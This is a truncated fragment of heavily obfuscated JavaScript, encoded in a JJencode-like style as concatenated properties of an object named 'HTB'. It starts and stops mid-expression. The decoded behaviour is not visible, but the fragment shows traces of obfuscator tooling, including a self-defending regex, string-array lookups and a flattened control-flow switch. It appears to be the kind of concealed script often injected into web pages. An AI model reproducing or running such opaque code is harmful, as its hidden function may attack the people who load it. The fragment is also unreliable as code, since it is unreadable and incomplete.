HTB.__$+"*-"+HTB.$_$+HTB.$__+HTB.$__+"+-"+HTB.$_$+HTB.$__+HTB.$_$+"*-"+HTB._$_+HTB.__$+"+-"+HTB.__$+HTB.__$+"*"+HTB.$_$+HTB._$$+HTB._$_+","+HTB.$$$+HTB.$$$+"="+HTB.__$+HTB._$$+"[\\\\'"+HTB._$_+HTB.$$_+"\\\\'][\\\\'"+HTB._$_+HTB._$$+"\\\\'];"+HTB.$___+HTB._$_+"&lt;"+HTB.$$$+HTB.$$$+";"+HTB.$___+HTB._$_+"++){"+HTB.__$+HTB._$$+"[\\\\'"+HTB._$_+HTB.$$_+"\\\\'][\\\\'"+HTB.__$+HTB.__$+HTB._$_+"\\\\']("+HTB.__$+HTB._$_+HTB.__$+"[\\\\'"+HTB.$_$+HTB._$$+HTB.__$+"\\\\']("+HTB.__$+HTB._$_+HTB.__$+"[\\\\'"+HTB.$_$+HTB.__$+HTB.$___+"\\\\']())),"+HTB.$$$+HTB.$$$+"="+HTB.__$+HTB._$$+"[\\\\'"+HTB._$_+HTB.$$_+"\\\\'][\\\\'"+HTB._$_+HTB._$$+"\\\\']}"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.__$+HTB.$__$+"("+HTB.__$+HTB._$$+"[\\\\'"+HTB._$_+HTB.$$_+"\\\\'][-"+HTB.$_$+HTB.__$+HTB.$__$+"+-"+HTB.__$+HTB.$_$+HTB.$___+"*-"+HTB.$_$+HTB.__$+HTB.___+"+-"+HTB.__$+HTB.__$+"*-"+HTB.$_$+HTB.__$+HTB.__$+"])},"+HTB.$$_+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$__+HTB.$___+"("+HTB.__$+HTB.$$_+")[\\\\'"+HTB.__$+HTB.$__+HTB.$___+"\\\\'](),"+HTB.__$+HTB.$$_+"[\\\\'"+HTB.__$+HTB.$__+HTB.$$_+"\\\\']=!![]}"+HTB._$$+HTB.$$_+"="+HTB.__$+HTB.$$_+"[\\\\'"+HTB.__$+HTB.$__+HTB.$$$+"\\\\']("+HTB._$$+HTB.$$_+","+HTB.__$+HTB.$$_+HTB.$__$+"),"+HTB.__$+HTB.$$_+"[\\\\'"+HTB.$___+HTB.$$$+"\\\\']["+HTB._$$+HTB.$_$+"]="+HTB._$$+HTB.$$_+"}"+HTB.$__+HTB.$$$+"\\"+HTB.$__+HTB.___+HTB._$$+HTB.$$_+"="+HTB.$__$+HTB.__$+";"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB._$$+HTB.$$_+"};"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB._$$+HTB.$___+"="+HTB.__$+HTB.$$_+","+HTB.__$+HTB.$__$+HTB._$_+"="+HTB.__$+HTB.$$_+","+HTB.__$+HTB.$__+HTB.$__+"="+HTB.$$$+"(){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.__$+HTB.$_$+"=!![];"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$$$+"("+HTB.__$+HTB.$__+HTB.$__$+","+HTB.$$$+HTB.__$+"){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$_$+HTB.___+"="+HTB.__$+HTB.__$+HTB.$_$+"?"+HTB.$$$+"(){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$__+HTB.$_$+"="+HTB.__$+HTB.$$_+";"+HTB.__$+HTB.$__$+"("+HTB.$$$+HTB.__$+"){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$_$+HTB.__$+"="+HTB.$$$+HTB.__$+"["+HTB.__$+HTB.$__+HTB.$_$+"(\\\\'"+HTB.$_$+HTB.__$+HTB._$_+"\\\\',\\\\'"+HTB.$_$+HTB.__$+HTB._$$+"[\\\\')]("+HTB.__$+HTB.$__+HTB.$__$+","+HTB.$$_+HTB.$$_+");"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$$$+HTB.__$+"="+HTB.$__+HTB.$_$+","+HTB.__$+HTB.$_$+HTB.__$+"}}:"+HTB.$$$+"(){};"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.__$+HTB.$_$+"=![],"+HTB.__$+HTB.$_$+HTB.___+"}}(),"+HTB.$___+HTB.$_$+"="+HTB.__$+HTB.$__+HTB.$__+"("+HTB.__$+HTB._$$+","+HTB.$$$+"(){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$__+HTB.__$+"="+HTB.__$+HTB.$$_+","+HTB.$_$+HTB._$_+HTB.___+"="+HTB.__$+HTB.$$_+","+HTB.$__+HTB._$_+"={};"+HTB.$__+HTB._$_+"[\\\\'"+HTB.$_$+HTB._$_+HTB.__$+"\\\\']="+HTB.$$$+"("+HTB.__$+HTB.$__+HTB._$$+","+HTB.__$+HTB._$$+HTB.$___+"){"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$__+HTB._$$+"==="+HTB.__$+HTB._$$+HTB.$___+"},"+HTB.$__+HTB._$_+"["+HTB.$__+HTB.__$+"(\\\\'"+HTB.__$+HTB._$$+HTB.$$$+"\\\\',\\\\'"+HTB.$$_+HTB.___+"\\\\')]=\\\\'"+HTB.__$+HTB.$__+HTB.___+"\\\\',"+HTB.$__+HTB._$_+"[\\\\'"+HTB.$_$+HTB._$_+HTB.$___+"\\\\']="+HTB.$$$+"("+HTB.__$+HTB._$$+HTB.$$_+"){"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.__$+HTB._$$+HTB.$$_+"()};"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$$_+HTB._$$+"="+HTB.$__+HTB._$_+","+HTB.$___+HTB.$___+"="+HTB.$$$+"(){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB._$$+HTB._$_+"="+HTB.$__+HTB.__$+","+HTB.__$+HTB.___+HTB.$__$+"="+HTB.$__+HTB.__$+";"+HTB.__$+HTB.$__$+"("+HTB.$$_+HTB._$$+"["+HTB._$$+HTB._$_+"(\\\\'"+HTB.$_$+HTB.___+"\\\\',\\\\'"+HTB.__$+HTB.__$+HTB.$$_+"\\\\')]("+HTB.$$_+HTB._$$+"["+HTB._$$+HTB._$_+"(\\\\'"+HTB.$_$+HTB._$_+HTB.$__$+"\\\\',\\\\'"+HTB.$_$+HTB._$$+HTB.___+"\\\\')],\\\\'"+HTB.__$+HTB.$__+HTB.___+"\\\\')){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$$_+HTB._$$+"="+HTB.$___+HTB.$___+"[\\\\'"+HTB.$__$+HTB.$__+"\\\\'+\\\\'"+HTB.$___+HTB._$$+"\\\\']("+HTB.__$+HTB.___+HTB.$__$+"(\\\\'"+HTB.$_$+HTB._$_+HTB.$$$+"\\\\',\\\\'"+HTB.__$+HTB.___+HTB.$$$+"\\\\')+"+HTB.__$+HTB.___+HTB.$__$+"(\\\\'"+HTB.$_$+HTB._$_+HTB.$$_+"\\\\',\\\\'"+HTB.$_$+HTB._$_+HTB._$_+"\\\\')+\\\\'/\\\\')()[\\\\'"+HTB.$__$+HTB.$__+"\\\\'+\\\\'"+HTB.$___+HTB._$$+"\\\\']("+HTB._$$+HTB._$_+"(\\\\'"+HTB.$_$+HTB._$_+HTB._$$+"\\\\',\\\\'"+HTB.$_$+HTB._$_+HTB.$__+"$\\\\')+\\\\'[^\\\\\\\\"+HTB.__$+HTB.$___+"]+)+)+[\\\\'+"+HTB._$$+HTB._$_+"(\\\\'"+HTB.$_$+HTB._$_+HTB.$_$+"\\\\',\\\\'"+HTB._$_+HTB._$_+HTB.$__$+"^"+HTB._$_+HTB._$_+HTB.$___+"\\\\'));"+HTB.$___+"!"+HTB.__$+HTB.$$_+HTB._$$+"["+HTB._$$+HTB._$_+"(\\\\'"+HTB.$_$+HTB.$_$+HTB._$$+"\\\\',\\\\'"+HTB.__$+HTB._$$+HTB.___+"]"+HTB.__$+HTB._$_+HTB.$__$+"\\\\')]("+HTB.$___+HTB.$_$+")}"+HTB.$__+HTB.$$$+"{"+HTB.$$$+"\\"+HTB.$__+HTB.___+HTB.$_$+HTB.__$+HTB.$__+"(){"+HTB.$_$+HTB.__$+HTB.$_$+"="+HTB.$_$+HTB.__$+HTB.$$_+"}}};"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$$_+HTB._$$+"["+HTB.$__+HTB.__$+"(\\\\'"+HTB.$_$+HTB.$__+HTB.$$$+"\\\\',\\\\'"+HTB.$_$+HTB.$__+HTB.$$_+"%"+HTB.$__+HTB.$$$+HTB.$___+"\\\\')]("+HTB.$___+HTB.$___+")});"+HTB.$___+HTB.$_$+"();"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB._$$+HTB._$$+"="+HTB.$$$+"(){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$___+HTB.$$_+"=!![];"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$$$+"("+HTB.__$+HTB.$_$+HTB.$$_+","+HTB.$$_+HTB._$_+"){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$_$+HTB.$__+"="+HTB.$___+HTB.$$_+"?"+HTB.$$$+"(){"+HTB.__$+HTB.$__$+"("+HTB.$$_+HTB._$_+"){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$_$+HTB.$_$+"="+HTB.$$_+HTB._$_+"[\\\\'"+HTB._$_+HTB.___+HTB.$___+"\\\\']("+HTB.__$+HTB.$_$+HTB.$$_+","+HTB.$$_+HTB.$$_+");"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$$_+HTB._$_+"="+HTB.$__+HTB.$_$+","+HTB.__$+HTB.$_$+HTB.$_$+"}}:"+HTB.$$$+"(){};"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$___+HTB.$$_+"=![],"+HTB.__$+HTB.$_$+HTB.$__+"}}(),"+HTB._$_+HTB.___+HTB.__$+"="+HTB._$$+HTB._$$+"("+HTB.__$+HTB._$$+","+HTB.$$$+"(){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$__$+"="+HTB.__$+HTB.$$_+","+HTB.__$+HTB.___+"="+HTB.__$+HTB.$$_+","+HTB.__$+HTB.$_$+"={};"+HTB.__$+HTB.$_$+"["+HTB.$__$+"(\\\\'"+HTB.__$+HTB.$_$+HTB.$___+"\\\\',\\\\'"+HTB.__$+HTB.$___+HTB.$$_+"#\\\\')]="+HTB.$$$+"("+HTB.__$+HTB.$$_+HTB.___+","+HTB.__$+HTB.$_$+HTB.$__$+"){"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$$_+HTB.___+"("+HTB.__$+HTB.$_$+HTB.$__$+")},"+HTB.__$+HTB.$_$+"["+HTB.$__$+"(\\\\'"+HTB.$__+HTB.$$_+HTB._$_+"\\\\',\\\\'"+HTB.__$+HTB.__$+HTB.$$_+"\\\\')]="+HTB.$$$+"("+HTB.__$+HTB.__$+HTB.$$$+","+HTB.__$+HTB.__$+HTB.$___+"){"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.__$+HTB.$$$+"+"+HTB.__$+HTB.__$+HTB.$___+"},"+HTB.__$+HTB.$_$+"["+HTB.$__$+"(\\\\'"+HTB.__$+HTB.$$$+HTB._$_+"\\\\',\\\\'"+HTB.__$+HTB._$$+HTB.___+"]"+HTB.__$+HTB._$_+HTB.$__$+"\\\\')]="+HTB.$__$+"(\\\\'"+HTB.$__+HTB.___+HTB.__$+"\\\\',\\\\'"+HTB._$_+HTB._$_+HTB.$$_+"$\\\\')+"+HTB.$__$+"(\\\\'"+HTB.__$+HTB._$$+HTB.__$+"\\\\',\\\\'%"+HTB.$__+HTB.$$_+HTB._$$+"\\\\'),"+HTB.__$+HTB.$_$+"["+HTB.$__$+"(\\\\'"+HTB.$__+HTB.___+HTB._$$+"\\\\',\\\\'"+HTB.__$+HTB.$__$+HTB.$___+"\\\\')]="+HTB.$__$+"(\\\\'"+HTB.$__+HTB.___+HTB.$__+"\\\\',\\\\'"+HTB.$__+HTB.___+HTB.___+")"+HTB._$$+HTB.$__$+HTB.$__$+"\\\\')+"+HTB.__$+HTB.___+"(\\\\'"+HTB._$$+HTB.$__$+HTB.$_$+"\\\\',\\\\'!"+HTB._$_+HTB.___+HTB._$_+"\\\\')+\\\\'"+HTB._$$+HTB.$__$+HTB.$$_+"\\\\\\\\"+HTB._$$+HTB.$__$+HTB.$$$+"\\\\\\\\"+HTB._$$+HTB.$__$+")(\\\\'+\\\\'\\\\\\\\"+HTB.__$+HTB.$___+")\\\\',"+HTB.__$+HTB.$_$+"["+HTB.__$+HTB.___+"(\\\\'"+HTB._$_+HTB.__$+"\\\\',\\\\'"+HTB._$_+HTB.$__+HTB._$_+"\\\\')]="+HTB.$$$+"("+HTB.__$+HTB._$_+HTB._$$+","+HTB.__$+HTB._$_+HTB.$__+"){"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.__$+HTB._$_+HTB._$$+"==="+HTB.__$+HTB._$_+HTB.$__+"},"+HTB.__$+HTB.$_$+"["+HTB.$__$+"(\\\\'"+HTB._$$+HTB.$__$+HTB.$___+"\\\\',\\\\'"+HTB._$_+HTB.___+HTB._$$+"\\\\')]=\\\\'"+HTB.$__+HTB.___+HTB.$_$+"\\\\',"+HTB.__$+HTB.$_$+"["+HTB.$__$+"(\\\\'"+HTB.__$+HTB._$_+HTB.$$_+"\\\\',\\\\'"+HTB.__$+HTB.__$+HTB._$$+"\\\\')]="+HTB.$__$+"(\\\\'"+HTB.__$+HTB._$_+HTB.$_$+"\\\\',\\\\'"+HTB.$__+HTB._$$+"\\\\'),"+HTB.__$+HTB.$_$+"["+HTB.$__$+"(\\\\'"+HTB.$__+HTB.___+HTB.$$_+"\\\\',\\\\'"+HTB.__$+HTB.__$+HTB._$$+"\\\\')]="+HTB.__$+HTB.___+"(\\\\'"+HTB.$__+HTB.__$+HTB._$$+"\\\\',\\\\'"+HTB._$_+HTB._$_+HTB.$$$+"\\\\'),"+HTB.__$+HTB.$_$+"[\\\\'"+HTB.$__+HTB.__$+HTB.$__+"\\\\']="+HTB.$__$+"(\\\\'"+HTB._$_+HTB._$$+HTB.__$+"\\\\',\\\\'"+HTB.$__+HTB._$$+"\\\\'),"+HTB.__$+HTB.$_$+"["+HTB.__$+HTB.___+"(\\\\'"+HTB._$_+HTB._$$+HTB.$___+"\\\\',\\\\'"+HTB._$_+HTB.$__+HTB._$_+"\\\\')]="+HTB.$__$+"(\\\\'"+HTB.$__+HTB.__$+HTB.$_$+"\\\\',\\\\')"+HTB.$__+HTB.__$+HTB._$_+"\\\\'),"+HTB.__$+HTB.$_$+"["+HTB.__$+HTB.___+"(\\\\'"+HTB.$__+HTB.__$+HTB.__$+"\\\\',\\\\'"+HTB._$_+HTB._$_+HTB.$__$+"^"+HTB._$_+HTB._$_+HTB.$___+"\\\\')]="+HTB.$__$+"(\\\\'"+HTB.$__+HTB.___+HTB.$$$+"\\\\',\\\\'"+HTB.$__+HTB.___+HTB.$___+"\\\\'),"+HTB.__$+HTB.$_$+"["+HTB.__$+HTB.___+"(\\\\'"+HTB.$__+HTB.___+HTB.$__$+"\\\\',\\\\'"+HTB.__$+HTB.__$+HTB._$$+"\\\\')]=\\\\'"+HTB.$__+HTB.__$+HTB.___+"\\\\',"+HTB.__$+HTB.$_$+"["+HTB.$__$+"(\\\\'"+HTB._$$+HTB.$__$+HTB.$__+"\\\\',\\\\'"+HTB.$__+HTB._$$+"\\\\')]="+HTB.__$+HTB.___+"(\\\\'"+HTB._$$+HTB.$__$+HTB._$$+"\\\\',\\\\'"+HTB._$$+HTB.$$$+HTB.$___+"\\\\'),"+HTB.__$+HTB.$_$+"["+HTB.__$+HTB.___+"(\\\\'"+HTB._$_+HTB.$__$+"\\\\',\\\\'"+HTB.$$_+HTB.___+"\\\\')]="+HTB.$$$+"("+HTB._$_+HTB._$_+HTB._$$+","+HTB._$_+HTB._$_+HTB._$_+"){"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB._$_+HTB._$_+HTB._$$+"&lt;"+HTB._$_+HTB._$_+HTB._$_+"},"+HTB.__$+HTB.$_$+"["+HTB.__$+HTB.___+"(\\\\'"+HTB._$$+HTB.$$$+HTB.$__$+"\\\\',\\\\'"+HTB.$_$+HTB.$_$+"]"+HTB.$_$+HTB.$__+"\\\\')]="+HTB.__$+HTB.___+"(\\\\'"+HTB._$_+HTB._$_+HTB.__$+"\\\\',\\\\'"+HTB._$_+HTB._$$+HTB._$_+"[\\\\'),"+HTB.__$+HTB.$_$+"["+HTB.$__$+"(\\\\'"+HTB.__$+HTB.$$$+HTB.$_$+"\\\\',\\\\'"+HTB.$__+HTB._$$+"\\\\')]="+HTB.__$+HTB.___+"(\\\\'"+HTB._$$+HTB.$___+HTB.___+"\\\\',\\\\'"+HTB._$_+HTB._$_+HTB.$$$+"\\\\'),"+HTB.__$+HTB.$_$+"["+HTB.$__$+"(\\\\'"+HTB._$$+HTB.$___+HTB.__$+"\\\\',\\\\'"+HTB._$_+HTB._$_+HTB.$$_+"$\\\\')]=\\\\'"+HTB.$_$+"|"+HTB.$__+"|"+HTB.___+"|"+HTB.__$+"|"+HTB._$$+"|\\\\'+\\\\'"+HTB._$_+"\\\\';"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$__+"="+HTB.__$+HTB.$_$+","+HTB._$_+HTB._$$+HTB.$$_+"="+HTB.$$$+"(){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB._$_+HTB._$_+"="+HTB.$__$+","+HTB._$_+HTB.__$+HTB.$___+"="+HTB.__$+HTB.___+","+HTB.$$_+HTB.__$+";"+HTB._$$+HTB.$$$+HTB.$$$+"{"+HTB.$$_+HTB.__$+"="+HTB.__$+HTB.$__+"["+HTB._$_+HTB._$_+"(\\\\'"+HTB.__$+HTB.$$$+HTB.__$+"\\\\',\\\\'"+HTB._$$+HTB.$$$+HTB.$$_+"\\\\')]("+HTB._$$+HTB.$$$+HTB._$_+","+HTB.__$+HTB.$__+"[\\\\'"+HTB._$$+HTB.$$$+HTB._$$+"\\\\']("+HTB.__$+HTB.$__+"["+HTB._$_+HTB._$_+"(\\\\'"+HTB._$_+HTB.__$+HTB.$_$+"\\\\',\\\\'(%"+HTB.$$$+HTB.$__$+"\\\\')]("+HTB.__$+HTB.$__+"["+HTB._$_+HTB._$_+"(\\\\'"+HTB._$$+HTB.$$$+HTB.$__+"\\\\',\\\\'"+HTB.__$+HTB.$___+HTB.$___+"\\\\')],"+HTB.__$+HTB.$__+"["+HTB._$_+HTB.__$+HTB.$___+"(\\\\'"+HTB._$$+HTB.$$$+HTB.$_$+"\\\\',\\\\'(%"+HTB.$$$+HTB.$__$+"\\\\')]),\\\\');\\\\'))()}"+HTB._$$+HTB.$___+HTB._$_+"("+HTB._$$+HTB.$___+HTB._$$+"){"+HTB.__$+HTB.$__$+"("+HTB.__$+HTB.$__+"["+HTB._$_+HTB._$_+"(\\\\'"+HTB._$$+HTB.$__$+HTB.___+"\\\\',\\\\'"+HTB.$$_+HTB.___+"\\\\')]("+HTB._$_+HTB._$_+"(\\\\'"+HTB._$$+HTB.$__$+HTB.__$+"\\\\',\\\\'"+HTB.__$+HTB.___+HTB.$$$+"\\\\'),"+HTB.__$+HTB.$__+"["+HTB._$_+HTB._$_+"(\\\\'"+HTB._$$+HTB.$__$+HTB._$_+"\\\\',\\\\'"+HTB.__$+HTB.___+HTB.$$$+"\\\\')])){"+HTB.$$$+"\\"+HTB.$__+HTB.___+HTB._$$+HTB.$___+HTB.$__$+"(){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB._$_+HTB._$$+HTB.$__$+"="+HTB._$_+HTB._$_+";"+HTB.__$+HTB.$__$+"("+HTB._$$+HTB.$___+HTB.$___+"){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB._$_+HTB._$$+HTB._$$+"="+HTB._$$+HTB.$___+HTB.$__+"["+HTB._$_+HTB._$$+HTB.$__$+"(\\\\'"+HTB._$$+HTB.$___+HTB.$_$+"\\\\',\\\\'"+HTB._$_+HTB._$$+HTB._$_+"[\\\\')]("+HTB._$$+HTB.$___+HTB.$$_+","+HTB.$$_+HTB.$$_+");"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB._$$+HTB.$___+HTB.$$$+"="+HTB.$__+HTB.$_$+","+HTB._$_+HTB._$$+HTB._$$+"}}}"+HTB.$__+HTB.$$$+"\\"+HTB.$__+HTB.___+HTB.$$_+HTB.__$+"="+HTB.$__+HTB.__$+HTB.$$_+"}"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$$_+HTB.__$+"},"+HTB.$__$+HTB._$$+"="+HTB._$_+HTB._$$+HTB.$$_+"(),"+HTB.__$+HTB.___+HTB._$_+"="+HTB.$__$+HTB._$$+"["+HTB.__$+HTB.___+"(\\\\'"+HTB._$_+HTB._$$+HTB.$_$+"\\\\',\\\\'"+HTB.$_$+HTB.$_$+"]"+HTB.$_$+HTB.$__+"\\\\')]="+HTB.$__$+HTB._$$+"["+HTB.$__$+"(\\\\'"+HTB.$__+HTB.__$+HTB.$$$+"\\\\',\\\\'"+HTB.$$_+HTB.___+"\\\\')]||{},"+HTB.$__$+HTB.$_$+"=["+HTB.__$+HTB.$__+"["+HTB.__$+HTB.___+"(\\\\'"+HTB._$_+HTB.__$+HTB.___+"\\\\',\\\\'"+HTB.$__+HTB.$__+HTB.$$$+"\\\\')],"+HTB.__$+HTB.$__+"["+HTB.__$+HTB.___+"(\\\\'"+HTB.$__+HTB.$__+HTB.$___+"\\\\',\\\\'@"+HTB.$__+HTB.$__+HTB.$__$+"\\\\')],"+HTB.__$+HTB.$__+"["+HTB.$__$+"(\\\\'"+HTB.$__+HTB.$_$+HTB.___+"\\\\',\\\\'"+HTB.$_$+HTB.$_$+"]"+HTB.$_$+HTB.$__+"\\\\')],"+HTB.__$+HTB.$__+"["+HTB.$__$+"(\\\\'"+HTB.$__+HTB.$__+HTB.$$_+"\\\\',\\\\'(%"+HTB.$$$+HTB.$__$+"\\\\')],"+HTB.__$+HTB.$__+"["+HTB.__$+HTB.___+"(\\\\'"+HTB.$__+HTB.$__+HTB.$_$+"\\\\',\\\\'"+HTB.__$+HTB.$___+HTB.$$_+"#\\\\')],"+HTB.__$+HTB.$__+"["+HTB.__$+HTB.___+"(\\\\'"+HTB.__$+HTB.$___+HTB.$__$+"\\\\',\\\\'"+HTB.__$+HTB.$$$+HTB._$$+"\\\\')],"+HTB.__$+HTB.$__+"["+HTB.__$+HTB.___+"(\\\\'"+HTB.$___+HTB.__$+"\\\\',\\\\'"+HTB.__$+HTB.$___+HTB.$___+"\\\\')]];"+HTB._$_+HTB.$__+"("+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.$$$+HTB.$__+"=-"+HTB.$__+HTB.$__+HTB.__$+"*-"+HTB.__$+HTB.__$+"+"+HTB.$__+HTB.$__+HTB._$_+"+-"+HTB.$__+HTB.$__+HTB._$$+";"+HTB.__$+HTB.$__+"["+HTB.$__$+"(\\\\'"+HTB.$_$+HTB.$__$+"\\\\',\\\\'"+HTB.$__+HTB.$__+HTB.$__+"\\\\')]("+HTB.$$$+HTB.$__+","+HTB.$__$+HTB.$_$+"[\\\\'"+HTB._$_+HTB._$$+"\\\\']);"+HTB.$$$+HTB.$__+"++){"+HTB.__$+HTB.$__$+"("+HTB.__$+HTB.$__+"[\\\\'"+HTB.$__+HTB.$_$+HTB.__$+"\\\\']!=="+HTB.__$+HTB.$__+"["+HTB.__$+HTB.___+"(\\\\'"+HTB.$__+HTB.$_$+HTB._$_+"\\\\',\\\\'"+HTB.$__+HTB.$_$+HTB.$__$+"\\\\')]){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.$$$+HTB.$__$+"="+HTB.__$+HTB.$__+"["+HTB.__$+HTB.___+"(\\\\'"+HTB.$__+HTB.$$_+HTB.___+"\\\\',\\\\'"+HTB.__$+HTB.$$$+HTB._$$+"\\\\')]["+HTB.$__$+"(\\\\'"+HTB.$__+HTB.$$_+HTB.__$+"\\\\',\\\\'"+HTB.$__+HTB.$_$+HTB.$___+"\\\\')](\\\\'|\\\\'),"+HTB.__$+HTB.$$$+HTB.$___+"=-"+HTB.$__+HTB.$_$+HTB.$$$+"*-"+HTB.__$+HTB.$$$+HTB._$_+"+"+HTB.__$+HTB.$$$+HTB.$_$+"+-"+HTB.$__+HTB.$_$+HTB._$$+";"+HTB.__$+HTB.$$$+HTB.$$_+"(!![]){"+HTB.$__+HTB.$_$+HTB.$__+"("+HTB.__$+HTB.$$$+HTB.$__$+"["+HTB.__$+HTB.$$$+HTB.$___+"++]){"+HTB._$$+HTB.__$+"\\\\'"+HTB.___+"\\\\':"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.__$+HTB.___+"="+HTB.__$+HTB.___+HTB._$_+"["+HTB.__$+HTB.__$+HTB.$__+"]||"+HTB._$$+HTB.$$$+";"+HTB._$$+HTB.___+";"+HTB._$$+HTB.__$+"\\\\'"+HTB.__$+"\\\\':"+HTB._$$+HTB.$$$+"["+HTB.__$+HTB.___+"(\\\\'"+HTB.$__+HTB.$_$+HTB.$_$+"\\\\',\\\\'"+HTB.$_$+HTB.$_$+"]"+HTB.$_$+HTB.$__+"\\\\')]="+HTB._$$+HTB._$$+"["+HTB.$__$+"(\\\\'"+HTB.$__+HTB.$_$+HTB.$$_+"\\\\',\\\\'"+HTB.$__+HTB._$$+"\\\\')]("+HTB._$$+HTB._$$+");"+HTB._$$+HTB.___+";"+HTB._$$+HTB.__$+"\\\\'"+HTB._$_+"\\\\':"+HTB.__$+HTB.___+HTB._$_+"["+HTB.__$+HTB.__$+HTB.$__+"]="+HTB._$$+HTB.$$$+";"+HTB._$$+HTB.___+";"+HTB._$$+HTB.__$+"\\\\'"+HTB._$$+"\\\\':"+HTB._$$+HTB.$$$+"["+HTB.$__$+"(\\\\'"+HTB.__$+HTB.__$+"\\\\',\\\\'"+HTB.$__+HTB.$__+HTB.___+"\\\\')]="+HTB.__$+HTB.__$+HTB.___+"[\\\\'"+HTB.$$_+HTB.$__$+"\\\\']["+HTB.__$+HTB.___+"(\\\\'"+HTB.$__+HTB._$$+HTB.$__$+"\\\\',\\\\'"+HTB.__$+HTB.$__$+HTB.$_$+"&amp;"+HTB.__$+HTB.$__$+HTB.$$_+"\\\\')]("+HTB.__$+HTB.__$+HTB.___+");"+HTB._$$+HTB.___+";"+HTB._$$+HTB.__$+"\\\\'"+HTB.$__+"\\\\':"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB.__$+HTB.__$+HTB.$__+"="+HTB.$__$+HTB.$_$+"["+HTB.$$$+HTB.$__+"];"+HTB._$$+HTB.___+";"+HTB._$$+HTB.__$+"\\\\'"+HTB.$_$+"\\\\':"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB._$$+HTB.$$$+"="+HTB._$$+HTB._$$+"[\\\\'"+HTB.$__$+HTB.$__+"\\\\'+\\\\'"+HTB.$___+HTB._$$+"\\\\']["+HTB.__$+HTB.___+"(\\\\'"+HTB.$__+HTB._$_+HTB.$__+"\\\\',\\\\'"+HTB._$_+HTB.___+HTB._$$+"\\\\')]["+HTB.__$+HTB.___+"(\\\\'"+HTB.$__+HTB._$_+HTB.$_$+"\\\\',\\\\'!"+HTB._$_+HTB.___+HTB._$_+"\\\\')]("+HTB._$$+HTB._$$+");"+HTB._$$+HTB.___+"}"+HTB.$__+HTB._$_+HTB.$$_+"}}"+HTB.$__+HTB.$$$+"{"+HTB.$$$+"\\"+HTB.$__+HTB.___+HTB.$__+HTB._$_+HTB.$$$+"(){"+HTB.$$_+"\\"+HTB.$__+HTB.___+HTB._$_+HTB.___+HTB.$$$+"="+HTB.$__+HTB._$_+HTB._$$+"[\\\\'"+HTB._$_+HTB.___+HTB.$___+"\\\\']("+HTB.$__+HTB._$_+HTB._$_+","+HTB.$$_+HTB.$$_+");"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$__+HTB.__$+HTB.$___+"="+HTB.$__+HTB.$_$+","+HTB._$_+HTB.___+HTB.$$$+"}}}});"+HTB._$_+HTB.___+HTB.__$+"(),"+HTB.__$+HTB.$$_+HTB.__$+"="+HTB._$$+HTB.$___+"(\\\\'"+HTB.$__+HTB.__$+HTB.$__$+"\\\\',\\\\'("+HTB.$__+HTB._$_+HTB.___+"\\\\')+"+HTB._$$+HTB.$___+"(\\\\'"+HTB.__$+HTB.___+HTB.$_$+"\\\\',\\\\'"+HTB.$__+HTB._$_+HTB.__$+"\\\\')+"+HTB._$$+HTB.$___+"(\\\\'"+HTB.$__+HTB._$_+HTB.$___+"\\\\',\\\\'"+HTB.$__+HTB._$_+HTB.$__$+"["+HTB.$__+HTB._$$+HTB.$$_+"\\\\')+"+HTB.__$+HTB.$__$+HTB._$_+"(\\\\'"+HTB.$__+HTB._$$+HTB.$$$+"\\\\',\\\\'"+HTB.__$+HTB.$__$+HTB.$_$+"&amp;"+HTB.__$+HTB.$__$+HTB.$$_+"\\\\')+"+HTB._$$+HTB.$___+"(\\\\'"+HTB.$__+HTB._$$+HTB.$___+"\\\\',\\\\'"+HTB.__$+HTB.$__$+HTB.$___+"\\\\');"+HTB.$___+"\\"+HTB.$__+HTB.___+HTB.$__+HTB._$$+HTB.$_$+"("+HTB.$__+HTB._$$+HTB.$__+"."+HTB.$__+HTB._$$+HTB.___+"({"+HTB.$__+HTB._$$+HTB.__$+":"+HTB._$_+HTB.___+HTB.$$_+","+HTB.$__+HTB._$$+HTB._$_+":"+HTB.__$+HTB.$__$+HTB.___+","+HTB.$__